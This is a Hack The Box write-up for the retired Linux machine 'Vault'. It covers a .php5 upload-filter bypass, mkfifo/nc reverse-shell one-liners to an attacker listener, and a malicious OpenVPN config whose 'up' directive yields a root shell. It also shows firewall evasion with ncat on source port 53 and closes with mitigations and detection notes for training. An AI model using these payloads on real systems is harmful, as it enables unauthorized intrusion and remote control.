---
machine: Vault
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
pwned: null
tags: [linux, web, upload, pivot, openvpn, qemu, spice, firewall, gpg]
---

# Vault — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (30 Mar 2019). Reference writeup; not played on this profile.
> No flags, credentials or real keys.

## TL;DR

An image upload accepts alternative extensions (`.php5`) and yields a `www-data` shell. On `dave`'s desktop there are SSH credentials and a list of internal hosts. From `ubuntu`, the `DNS + Configurator` VM is reachable; its VPN panel runs an OpenVPN binary on an uploaded file, and the `up` directive executes commands as root. The `Vault` VM sits behind a firewall that only allows source/destination 53 and 4444; `ncat` with source port 53 bypasses it. The root flag is GPG-encrypted and decrypted on another VM.

## Recon

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 22,80 <TARGET_IP>
```

| Port | Service | Note |
|---|---|---|
| 22/tcp | SSH | Access as `dave` |
| 80/tcp | HTTP | `sparklays` app with upload |

```bash
feroxbuster -u http://<TARGET_IP>/sparklays/ -x php,html
```

## Foothold

### 1. Bypass the extension filter

`/sparklays/design/changelogo.php` uploads images to `/sparklays/design/uploads/`. A `.php` is rejected, but the filter checks the extension. Try alternative extensions; `.php5` is accepted and executed.

```bash
cp shell.php shell.php5
curl -s -F 'file=@shell.php5' http://<TARGET_IP>/sparklays/design/changelogo.php
curl -s 'http://<TARGET_IP>/sparklays/design/uploads/shell.php5?cmd=id'
```

### 2. Interactive shell

```bash
curl -s 'http://<TARGET_IP>/sparklays/design/uploads/shell.php5?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%20<LHOST>%20443%20%3E/tmp/f'
```

## Lateral movement

`/home/dave/Desktop` holds three files: an internal server list, a key and SSH credentials.

```bash
cat Servers
cat ssh
su dave
```

The list identifies `192.168.122.4` (DNS + Configurator), `192.168.122.5` (Firewall) and `Vault`. SSH in as `dave` and enumerate the internal network.

```bash
ssh dave@<TARGET_IP>
for i in $(seq 1 254); do ping -c1 -W1 192.168.122.$i | grep -q 'bytes from' && echo $i; done
```

## Shell on DNS as root

### 1. VPN panel

Create an SSH tunnel to view the panel:

```bash
ssh -L 8080:192.168.122.4:80 dave@<TARGET_IP>
```

`http://localhost:8080/vpnconfig.php` lets you upload a configuration and test it with `?function=testvpn`. OpenVPN executes directives from the file; `up` runs after the tunnel is established.

### 2. Malicious configuration

```text
remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 8181 >/tmp/f'"
nobind
```

Listen on `8181` from the SSH session, upload the file and click **Test VPN**. The connection comes from `192.168.122.4` and the shell is `root`.

```bash
nc -lnvp 8181
```

## Shell on Vault

### 1. Understand the firewall

`Vault` is only reachable on port 987. The firewall allows traffic with source or destination 53 and 4444. A normal scan sees nothing; fix the source port.

```bash
nmap -sT -p 987 --source-port 53 192.168.5.2
```

### 2. Tunnel with source port 53

From `DNS` as root:

```bash
ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53" &
ssh dave@localhost -p 1234 -t bash
```

`-t bash` escapes the account's `rbash`. You are now on `Vault` as `dave`.

## Root / encrypted flag

`/home/dave/root.txt.gpg` is encrypted with a key that is not on `Vault`. Move the file to another VM in the lab, where the private key lives, and decrypt it:

```bash
base32 root.txt.gpg > root.b32
# transfer and decode on the other VM
gpg -d root.txt.gpg
```

No passphrase or key is published. On this box the escalation is not a local root shell: the goal is the decrypted flag.

## Evidence

- `shell.php5` upload and `id` execution.
- `Servers` and `dave` credentials (redacted).
- `vpnconfig.php` panel and the OpenVPN connection.
- `ncat` with `-p 53` and a shell on `vault`.
- `gpg -d` on `root.txt.gpg`.

## Lessons learned

- Extension filters are bypassed with extensions the server still interprets.
- A panel that runs OpenVPN on a user file is root RCE when `script-security 2` is allowed.
- A firewall with source-port rules is not isolation: pin the source.
- Lateral movement between VMs is part of the design; not everything is on the initial host.
- An encrypted flag may require returning to another machine, not a local escalation.

## Mitigations and detection

- Allowlist extensions and validate real content with `finfo`; serve uploads from a non-executable directory.
- Do not allow `script-security 2` or `up`/`down` directives in user configurations.
- Segment with identity-aware rules, not just ports; monitor source-port-53 traffic to non-DNS hosts.
- Detection: `openvpn` processes with temporary configs, outbound connections from the panel, `ncat`/`ssh` from the DNS host and reads of `root.txt.gpg`.

MITRE: T1190, T1059.004, T1572, T1562.004, T1552.

## References

- <https://0xdf.gitlab.io/2019/04/06/htb-vault.html>
- <https://www.bleepingcomputer.com/news/security/downloading-3rd-party-openvpn-configs-may-be-dangerous-heres-why/>
- <https://man7.org/linux/man-pages/man1/ncat.1.html>
